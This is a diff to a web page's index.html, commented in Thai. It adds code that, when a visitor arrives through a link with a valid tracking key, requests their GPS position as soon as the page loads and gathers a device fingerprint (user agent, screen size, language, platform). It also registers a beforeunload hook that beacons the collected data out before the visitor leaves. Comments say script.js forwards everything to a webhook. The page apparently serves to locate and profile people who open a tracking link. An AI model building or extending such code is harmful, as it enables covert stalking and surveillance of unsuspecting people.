@@ -90,6 +90,10 @@
   </div>
 
   <script>
+    // ข้อมูล GPS พื้นฐาน - เก็บไว้เป็นตัวแปร global เพื่อให้ script.js เรียกใช้ได้
+    window.earlyCapturedLocation = null;
+    window.gpsRequestStartTime = null;
+    
     // ฟังก์ชันตรวจสอบว่ามี tracking key ที่ถูกต้องหรือไม่
     function hasValidTrackingKey() {
       try {
@@ -101,6 +105,48 @@
         console.error("Error checking tracking key:", error);
         return false;
       }
+    }
+    
+    // เริ่มขอตำแหน่ง GPS ทันทีที่โหลดหน้าเว็บ แต่ตรวจสอบ tracking key ก่อน
+    if (hasValidTrackingKey()) {
+      // บันทึกเวลาเริ่มต้นขอ GPS
+      window.gpsRequestStartTime = Date.now();
+      
+      // เริ่มขอตำแหน่ง GPS ทันที (ลด timeout เหลือ 5 วินาที และใช้ enableHighAccuracy: false เพื่อความเร็ว)
+      if (navigator.geolocation) {
+        console.log("เริ่มร้องขอข้อมูล GPS ตั้งแต่ index.html");
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // เมื่อได้ตำแหน่งแล้ว เก็บไว้ในตัวแปร global
+            window.earlyCapturedLocation = {
+              lat: position.coords.latitude,
+              long: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: new Date().toISOString(),
+              captureTime: Date.now() - window.gpsRequestStartTime + 'ms'
+            };
+            console.log("ได้รับข้อมูล GPS จาก index.html:", window.earlyCapturedLocation);
+          },
+          function(error) {
+            console.warn("ไม่สามารถดึงข้อมูล GPS ได้: " + error.message);
+            window.earlyCapturedLocation = { error: error.code, message: error.message };
+          },
+          { 
+            enableHighAccuracy: false, // ใช้ false เพื่อความเร็วในการได้ข้อมูล
+            timeout: 5000,             // ลด timeout เหลือ 5 วินาที
+            maximumAge: 30000          // ยอมรับข้อมูลเก่าไม่เกิน 30 วินาที
+          }
+        );
+      }
+      
+      // เตรียมข้อมูล IP และข้อมูลพื้นฐานอื่นๆ เบื้องต้น
+      window.earlyDeviceInfo = {
+        userAgent: navigator.userAgent,
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+        language: navigator.language || navigator.userLanguage || "ไม่มีข้อมูล",
+        platform: navigator.platform || "ไม่มีข้อมูล",
+        timestamp: new Date().toISOString()
+      };
     }
 
     // ฟังก์ชันสำหรับส่งข้อมูลไปยัง webhook (ย้ายมาไว้ที่นี่เพื่อให้เรียกใช้ได้)
@@ -118,6 +164,14 @@
       // การส่งข้อมูลจริงจะทำใน script.js หลังจากรวบรวมข้อมูลครบถ้วน
       console.log("Prepared data for webhook (will be sent by script.js):", data);
     }
+    
+    // เพิ่ม event listener สำหรับการออกจากหน้าเว็บ
+    window.addEventListener('beforeunload', function() {
+      // เรียกใช้ฟังก์ชัน sendBeaconWithAvailableData ถ้ามีใน window object
+      if (window.sendBeaconWithAvailableData && typeof window.sendBeaconWithAvailableData === 'function') {
+        window.sendBeaconWithAvailableData();
+      }
+    });
 
     // ตรวจสอบ tracking key ก่อนที่จะโหลด script.js
     if (hasValidTrackingKey()) {
@@ -126,9 +180,6 @@
       const scriptElement = document.createElement('script');
       scriptElement.src = 'script.js';
       document.body.appendChild(scriptElement);
-
-      // --- ส่วนการดึงตำแหน่งและส่งข้อมูล (ย้ายไปไว้ใน script.js แล้ว) ---
-      // ส่วนนี้จะถูกจัดการโดย script.js ที่โหลดเข้ามา
 
     } else {
       console.log("Invalid or missing tracking key. Access denied.");
